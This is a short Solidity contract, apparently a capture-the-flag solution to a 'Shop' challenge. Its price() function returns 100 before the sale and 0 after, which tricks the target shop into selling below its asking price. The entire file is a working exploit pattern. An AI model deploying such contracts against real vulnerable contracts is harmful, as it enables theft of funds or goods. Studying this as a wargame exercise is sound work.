// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IShop {
  function isSold() external view returns (bool);
   function buy() external;
}
contract shopAttack {
    IShop shop;

    constructor(IShop target) {
        shop = target;
    }
  function price() external view returns (uint) {
  
    if (shop.isSold()) {
        return 0;
    } else {
        return 100;
    }
  }

  function attack() external {
   shop.buy();
   }


}